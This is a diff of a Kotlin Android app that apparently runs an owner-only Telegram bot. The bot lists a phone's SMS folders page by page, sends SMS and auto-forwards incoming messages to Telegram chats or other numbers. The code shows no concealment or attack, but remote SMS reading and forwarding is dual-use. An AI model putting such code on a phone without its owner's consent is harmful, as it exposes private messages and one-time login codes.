@@ -19,6 +19,9 @@ class TelegramBot(
     private val userState = mutableMapOf<String, String>()
     private val userTempData = mutableMapOf<String, String>()
 
+    // Track current page per folder per user
+    private val pageMap = mutableMapOf<String, Int>() // key: "chatId_folder"
+
     // ─── Startup ──────────────────────────────────────────────────────────────
 
     fun sendStartupMessage() {
@@ -50,11 +53,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
     }
 
     fun stopPolling() { pollingJob?.cancel() }
-
-    fun reconnect() {
-        pollingJob?.cancel()
-        startPolling()
-    }
+    fun reconnect() { pollingJob?.cancel(); startPolling() }
 
     // ─── Fetch Updates ────────────────────────────────────────────────────────
 
@@ -114,7 +113,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
         }
     }
 
-    // ─── Handle Button Callbacks ──────────────────────────────────────────────
+    // ─── Handle Callbacks ─────────────────────────────────────────────────────
 
     private fun handleCallback(callbackQuery: JSONObject) {
         val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getString("id")
@@ -122,50 +121,60 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
         if (chatId != ownerChatId) return
         answerCallback(callbackQuery.getString("id"))
 
-        when (data) {
-            "menu_inbox"   -> showInbox(chatId)
-            "menu_sent"    -> showSent(chatId)
-            "menu_send"    -> {
+        when {
+            data == "menu_inbox"    -> showInbox(chatId, getPage(chatId, "inbox"))
+            data == "menu_sent"     -> showSent(chatId, getPage(chatId, "sent"))
+            data == "menu_send"     -> {
                 userState[chatId] = "awaiting_send_number"
                 sendMessage(chatId, "📞 Enter phone number:\n(Example: +919876543210)", buildCancelButton())
             }
-            "menu_forwards" -> sendMessage(chatId, "📋 *Auto-Forward Settings*", buildForwardMenu())
-            "menu_devices"  -> showManageDevices(chatId)
-            "menu_main"     -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
-            "inbox_refresh" -> showInbox(chatId)
-            "sent_refresh"  -> showSent(chatId)
-            "devices_refresh" -> showManageDevices(chatId)
+            data == "menu_forwards" -> sendMessage(chatId, "📋 *Auto-Forward Settings*", buildForwardMenu())
+            data == "menu_devices"  -> showManageDevices(chatId)
+            data == "menu_main"     -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
+            data == "device_sms"    -> showSmsManager(chatId)
+            data == "devices_refresh" -> showManageDevices(chatId)
 
-            "action_reconnect" -> {
+            // ── SMS Manager folders ──
+            data == "sms_inbox"   -> { setPage(chatId, "inbox", 0);   showInbox(chatId, 0) }
+            data == "sms_sent"    -> { setPage(chatId, "sent", 0);    showSent(chatId, 0) }
+            data == "sms_outbox"  -> { setPage(chatId, "outbox", 0);  showOutbox(chatId, 0) }
+            data == "sms_failed"  -> { setPage(chatId, "failed", 0);  showFailed(chatId, 0) }
+            data == "sms_forward" -> sendMessage(chatId, "📋 *Auto-Forward Settings*", buildForwardMenu())
+            data == "sms_back"    -> showSmsManager(chatId)
+
+            // ── Pagination ──
+            data.startsWith("page_") -> handlePagination(chatId, data)
+
+            // ── Reconnect ──
+            data == "action_reconnect" -> {
                 ConnectionMonitor.reconnectRequested = true
                 sendMessage(chatId, "🔄 *Reconnecting...*\nRestarting connection now!", null)
             }
 
-            "fwd_add_telegram" -> {
+            // ── Forward management ──
+            data == "fwd_add_telegram" -> {
                 userState[chatId] = "awaiting_tg_target"
                 sendMessage(chatId, "📲 Send username, channel or group link:\n\n• @username\n• @channelname\n• -1001234567890", buildCancelButton())
             }
-            "fwd_add_sms" -> {
+            data == "fwd_add_sms" -> {
                 userState[chatId] = "awaiting_sms_target"
                 sendMessage(chatId, "📞 Enter phone number to forward via SMS:", buildCancelButton())
             }
-            "fwd_list"  -> showForwardList(chatId)
-            "fwd_clear" -> {
+            data == "fwd_list"  -> showForwardList(chatId)
+            data == "fwd_clear" -> {
                 ForwardManager.clearAll(context)
                 sendMessage(chatId, "🗑️ All forward targets removed.", buildForwardMenu())
             }
-            "fwd_back" -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
+            data == "fwd_back" -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
 
-            "action_cancel" -> {
+            data == "action_cancel" -> {
                 userState.remove(chatId); userTempData.remove(chatId)
                 sendMessage(chatId, "❌ Cancelled.", buildMainMenu())
             }
 
-            else -> {
-                if (data.startsWith("remove_")) {
-                    ForwardManager.removeTarget(context, data.removePrefix("remove_"))
-                    sendMessage(chatId, "✅ Removed successfully.", buildForwardMenu())
-                }
+            data.startsWith("remove_") -> {
+                ForwardManager.removeTarget(context, data.removePrefix("remove_"))
+                sendMessage(chatId, "✅ Removed successfully.", buildForwardMenu())
             }
         }
     }
@@ -176,79 +185,163 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
         val info = DeviceInfoHelper.getInfo(context)
         val status = ConnectionMonitor.lastStatus
         val ping = ConnectionMonitor.lastPingMs
-
         val statusDot = when (status) {
-            ConnectionMonitor.Status.ONLINE -> "🟢 Online"
-            ConnectionMonitor.Status.WEAK   -> "🟡 Weak Connection"
+            ConnectionMonitor.Status.ONLINE  -> "🟢 Online"
+            ConnectionMonitor.Status.WEAK    -> "🟡 Weak"
             ConnectionMonitor.Status.OFFLINE -> "🔴 Offline"
         }
         val pingText = if (ping > 0) " — ${ping}ms" else ""
         val chargingText = if (info.isCharging) "⚡ Charging" else "Not charging"
-        val batteryEmoji = DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)
-        val serviceText = if (GatewayForegroundService.isRunning) "✅ Running" else "❌ Stopped"
-
         val text = """
 📱 *Manage Devices*
 
-*Device 1 — This Phone*
+*Device 1 — ${info.brandModel}*
 ─────────────────
-📶 Status: $statusDot$pingText
-📱 Device: ${info.brandModel}
-🤖 Android: ${info.androidVersion}
-$batteryEmoji Battery: ${info.batteryPercent}% ($chargingText)
-🌐 Dashboard: http://${info.ipAddress}:8080
-⚙️ Service: $serviceText
+📶 $statusDot$pingText
+${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.batteryPercent}% ($chargingText)
+⚙️ Service: ${if (GatewayForegroundService.isRunning) "✅ Running" else "❌ Stopped"}
         """.trimIndent()
 
         val keyboard = JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
+                    put(btn("💬 SMS Manager", "device_sms"))
+                })
+                put(JSONArray().apply {
                     put(btn("🔄 Refresh", "devices_refresh"))
                     put(btn("🔙 Back", "menu_main"))
                 })
                 if (status == ConnectionMonitor.Status.OFFLINE) {
-                    put(JSONArray().apply {
-                        put(btn("🔄 Reconnect Now", "action_reconnect"))
-                    })
+                    put(JSONArray().apply { put(btn("🔄 Reconnect Now", "action_reconnect")) })
                 }
             })
         }
         sendMessage(chatId, text, keyboard)
     }
 
-    // ─── Inbox ────────────────────────────────────────────────────────────────
+    // ─── SMS Manager Panel ────────────────────────────────────────────────────
 
-    private fun showInbox(chatId: String) {
-        val messages = SmsReader.getInbox(context, 10)
-        if (messages.isEmpty()) { sendMessage(chatId, "📭 Inbox is empty.", buildBackButton()); return }
-        val sb = StringBuilder("📥 *Inbox* — Latest 10\n\n")
-        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
-        sendMessage(chatId, sb.toString(), JSONObject().apply {
+    private fun showSmsManager(chatId: String) {
+        val inboxCount   = SmsReader.getInboxCount(context)
+        val sentCount    = SmsReader.getSentCount(context)
+        val outboxCount  = SmsReader.getOutboxCount(context)
+        val failedCount  = SmsReader.getFailedCount(context)
+        val fwdCount     = ForwardManager.getForwardTargets(context).size
+
+        val text = """
+💬 *SMS Manager*
+
+📥 Inbox      — $inboxCount messages
+📤 Sent       — $sentCount messages
+📨 Outbox     — $outboxCount messages
+❌ Failed     — $failedCount messages
+🔀 Forwards   — $fwdCount targets
+        """.trimIndent()
+
+        val keyboard = JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(btn("🔄 Refresh", "inbox_refresh"))
-                    put(btn("🔙 Back", "menu_main"))
+                    put(btn("📥 Inbox ($inboxCount)", "sms_inbox"))
+                    put(btn("📤 Sent ($sentCount)", "sms_sent"))
                 })
-            })
-        })
-    }
-
-    // ─── Sent ─────────────────────────────────────────────────────────────────
-
-    private fun showSent(chatId: String) {
-        val messages = SmsReader.getSent(context, 10)
-        if (messages.isEmpty()) { sendMessage(chatId, "📭 Sent box is empty.", buildBackButton()); return }
-        val sb = StringBuilder("📤 *Sent* — Latest 10\n\n")
-        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
-        sendMessage(chatId, sb.toString(), JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(btn("🔄 Refresh", "sent_refresh"))
-                    put(btn("🔙 Back", "menu_main"))
+                    put(btn("📨 Outbox ($outboxCount)", "sms_outbox"))
+                    put(btn("❌ Failed ($failedCount)", "sms_failed"))
+                })
+                put(JSONArray().apply {
+                    put(btn("🔀 Forward Settings", "sms_forward"))
+                })
+                put(JSONArray().apply {
+                    put(btn("🔙 Back", "menu_devices"))
                 })
             })
-        })
+        }
+        sendMessage(chatId, text, keyboard)
     }
+
+    // ─── Inbox with Pagination ────────────────────────────────────────────────
+
+    private fun showInbox(chatId: String, page: Int) {
+        setPage(chatId, "inbox", page)
+        val total = SmsReader.getInboxCount(context)
+        val messages = SmsReader.getInbox(context, SmsReader.PAGE_SIZE, page * SmsReader.PAGE_SIZE)
+        showFolder(chatId, "📥 Inbox", messages, page, total, "inbox", "sms_inbox", "sms_back")
+    }
+
+    private fun showSent(chatId: String, page: Int) {
+        setPage(chatId, "sent", page)
+        val total = SmsReader.getSentCount(context)
+        val messages = SmsReader.getSent(context, SmsReader.PAGE_SIZE, page * SmsReader.PAGE_SIZE)
+        showFolder(chatId, "📤 Sent", messages, page, total, "sent", "sms_sent", "sms_back")
+    }
+
+    private fun showOutbox(chatId: String, page: Int) {
+        setPage(chatId, "outbox", page)
+        val total = SmsReader.getOutboxCount(context)
+        val messages = SmsReader.getOutbox(context, SmsReader.PAGE_SIZE, page * SmsReader.PAGE_SIZE)
+        showFolder(chatId, "📨 Outbox", messages, page, total, "outbox", "sms_outbox", "sms_back")
+    }
+
+    private fun showFailed(chatId: String, page: Int) {
+        setPage(chatId, "failed", page)
+        val total = SmsReader.getFailedCount(context)
+        val messages = SmsReader.getFailed(context, SmsReader.PAGE_SIZE, page * SmsReader.PAGE_SIZE)
+        showFolder(chatId, "❌ Failed", messages, page, total, "failed", "sms_failed", "sms_back")
+    }
+
+    private fun showFolder(
+        chatId: String,
+        title: String,
+        messages: List<SmsMessage>,
+        page: Int,
+        total: Int,
+        folder: String,
+        refreshCallback: String,
+        backCallback: String
+    ) {
+        if (messages.isEmpty() && page == 0) {
+            sendMessage(chatId, "$title\n\n📭 No messages found.", buildSmsBackButton())
+            return
+        }
+
+        val totalPages = if (total == 0) 1 else ((total + SmsReader.PAGE_SIZE - 1) / SmsReader.PAGE_SIZE)
+        val sb = StringBuilder("$title — Page ${page + 1} of $totalPages\n\n")
+        messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
+
+        val navRow = JSONArray()
+        if (page > 0) navRow.put(btn("⬅️ Previous", "page_${folder}_${page - 1}"))
+        navRow.put(btn("🔄 Refresh", refreshCallback))
+        if ((page + 1) < totalPages) navRow.put(btn("➡️ Next", "page_${folder}_${page + 1}"))
+
+        val keyboard = JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(navRow)
+                put(JSONArray().apply { put(btn("🔙 Back", backCallback)) })
+            })
+        }
+        sendMessage(chatId, sb.toString(), keyboard)
+    }
+
+    // ─── Pagination Handler ───────────────────────────────────────────────────
+
+    private fun handlePagination(chatId: String, data: String) {
+        // data format: page_folder_pagenumber  e.g. page_inbox_1
+        val parts = data.split("_")
+        if (parts.size < 3) return
+        val folder = parts[1]
+        val page = parts[2].toIntOrNull() ?: 0
+        when (folder) {
+            "inbox"  -> showInbox(chatId, page)
+            "sent"   -> showSent(chatId, page)
+            "outbox" -> showOutbox(chatId, page)
+            "failed" -> showFailed(chatId, page)
+        }
+    }
+
+    // ─── Page Tracking ────────────────────────────────────────────────────────
+
+    private fun getPage(chatId: String, folder: String) = pageMap["${chatId}_$folder"] ?: 0
+    private fun setPage(chatId: String, folder: String, page: Int) { pageMap["${chatId}_$folder"] = page }
 
     // ─── Forward List ─────────────────────────────────────────────────────────
 
@@ -281,7 +374,7 @@ $batteryEmoji Battery: ${info.batteryPercent}% ($chargingText)
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
                     put(btn("↩️ Reply", "menu_send"))
-                    put(btn("📥 Inbox", "menu_inbox"))
+                    put(btn("📥 Inbox", "sms_inbox"))
                 })
             })
         })
@@ -330,6 +423,12 @@ $batteryEmoji Battery: ${info.batteryPercent}% ($chargingText)
     private fun buildBackButton() = JSONObject().apply {
         put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply { put(btn("🔙 Back to Menu", "menu_main")) })
+        })
+    }
+
+    private fun buildSmsBackButton() = JSONObject().apply {
+        put("inline_keyboard", JSONArray().apply {
+            put(JSONArray().apply { put(btn("🔙 Back", "sms_back")) })
         })
     }
 
